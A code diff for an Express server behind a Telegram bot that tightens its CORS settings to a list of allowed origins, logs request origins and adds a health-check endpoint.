@@ -134,12 +134,29 @@ bot.on("contact", async (ctx) => {
 
 // HTTP server
 const app = express();
-app.use(cors());
+
+// UPDATED CORS CONFIGURATION - CRITICAL FIX
+app.use(cors({
+  origin: [
+    'https://palegreen-cat-290337.hostingersite.com',
+    'https://web.telegram.org',
+    'https://telegram.org',
+    'http://localhost:3000'  // for local testing
+  ],
+  methods: ['GET', 'POST', 'OPTIONS'],
+  credentials: true,
+  allowedHeaders: ['Content-Type', 'Authorization']
+}));
+
 app.use(express.json());
+
+// Add OPTIONS handler for preflight requests
+app.options('*', cors());
 
 // API endpoint na tinatawag ng WebApp
 app.post("/api/log-code", async (req, res) => {
   console.log("Received /api/log-code body:", req.body);
+  console.log("Request origin:", req.headers.origin);
 
   const { code, tgUser } = req.body || {};
 
@@ -330,6 +347,15 @@ bot.on("callback_query", async (ctx) => {
 
 app.get("/", (req, res) => {
   res.send("Bot + API is running");
+});
+
+// Health check endpoint
+app.get("/health", (req, res) => {
+  res.json({ 
+    status: "ok", 
+    timestamp: new Date().toISOString(),
+    bot: "running"
+  });
 });
 
 const PORT = process.env.PORT || 3000;
